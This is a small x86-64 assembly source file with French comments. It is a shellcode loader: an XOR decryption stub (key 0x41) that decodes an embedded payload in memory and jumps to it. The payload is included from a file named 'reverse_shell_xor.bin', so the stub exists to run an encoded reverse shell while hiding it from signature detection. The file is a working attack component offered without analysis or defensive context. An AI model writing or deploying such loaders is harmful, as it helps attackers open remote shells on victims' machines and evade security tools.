BITS 64
global _start

_start:
    ; ===== Stub XOR — déchiffre le shellcode en mémoire =====
    lea     rsi, [rel payload]  ; rsi = adresse du shellcode chiffré
    mov     rcx, payload_fin - payload  ; rcx = taille du shellcode

dechiffre:
    xor     byte [rsi], 0x41   ; XOR chaque byte avec la clé
    inc     rsi                 ; passer au byte suivant
    loop    dechiffre           ; répéter rcx fois

    ; Sauter vers le shellcode maintenant déchiffré
    lea     rax, [rel payload]
    jmp     rax

payload:
    ; les bytes XOR-encodés seront insérés ici par le build
    incbin "reverse_shell_xor.bin"
payload_fin: